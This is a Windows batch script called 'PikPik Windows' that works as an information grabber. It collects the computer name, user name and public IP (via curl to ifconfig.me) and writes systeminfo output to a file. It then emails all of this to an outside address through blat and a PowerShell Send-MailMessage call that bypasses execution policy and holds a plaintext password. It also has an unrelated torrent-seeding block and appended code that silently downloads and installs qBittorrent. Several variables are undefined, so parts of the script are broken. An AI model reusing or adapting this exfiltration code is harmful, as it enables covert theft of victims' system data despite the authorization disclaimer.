rem ###########################################################
rem Autheur : Kuroakashiro
rem -------------------------
rem - FR -
rem Ce script doit être exécuté dans un environnement 
rem qui vous appartient ou pour lequel vous êtes autorisé 
rem à utiliser ce script. L'auteur et le fournisseur 
rem de ce script déclinent toute responsabilité quant 
rem à l'utilisation malveillante de ce script ou à toute
rem erreur qui pourrait survenir lors de l'exécution du script. 
rem ###########################################################
rem - EN -
rem This script must be executed in an environment that 
rem you own or are authorized to use. The author and 
rem provider of this script disclaim any responsibility 
rem for the malicious use of this script or any errors 
rem that may occur during the execution of the script
rem ###########################################################



@echo off
set back=%~dp0
mode con cols=70 lines=20
chcp 65001
title PikPik Windows




%COMPUTERNAME%
%USERNAME%
for /f "delims=" %%a in ('curl ifconfig.me/ip') do set PublicIP=%%a







rem Clear
cls

rem Creation Dossier de travail
mkdir PikPik
cd %back%\PikPik


systeminfo >> GrabInfo.txt










rem Partage de fichier BitTorrent
set file_path=C:\path\to\file.txt
set torrent_path=C:\path\to\save\torrent

echo Creating torrent file...
qbittorrent-nox.exe --create-torrent "%file_path%" -o "%torrent_path%"

echo Seeding torrent...
qbittorrent-nox.exe "%torrent_path%" --no-scan

echo Torrent created and seeded successfully!
pause




rem email a changer
set TO=caxok32339@snowlash.com
set FROM=sender@example.com
set PASSWORD=Motdepass1
set SUBJECT="Tu as recu des Information de la machine :%COMPUTERNAME% Utilisateur :%USERNAME%"
set BODY="L'IP publique de la machinne est : %PublicIP%"
set ATTACHMENT="%back%\PikPik\GrabInfo.txt"

echo %BODY% | blat -to %TO% -subject %SUBJECT% -server %SMTP_SERVER% -f %FROM%

rem Send email using PowerShell
powershell.exe -ExecutionPolicy Bypass -command "Send-MailMessage -To '%TO%' -From '%FROM%' -Subject '%SUBJECT%' -Body '%BODY% IP address: %IP% Public IP: %PUBLIC_IP%' -SmtpServer 'smtp.example.com' -Port 587 -UseSsl -Credential (New-Object System.Management.Automation.PSCredential ('%FROM%', (ConvertTo-SecureString '%PASSWORD%' -AsPlainText -Force))) -Attachments '%ATTACHMENT%'"
echo Email sent successfully!

exit


rem cod powershell d'installation pour torrent
# Télécharger le fichier d'installation de qBittorrent
$downloadUrl = "https://github.com/qbittorrent/qBittorrent/releases/download/release-4.3.7/qbittorrent_4.3.7_setup.exe"
$installerPath = "C:\qbittorrent_setup.exe"
Invoke-WebRequest -Uri $downloadUrl -OutFile $installerPath

# Installer qBittorrent en mode silencieux
Start-Process -FilePath $installerPath -ArgumentList "/S" -Wait

# Supprimer le fichier d'installation
Remove-Item $installerPath

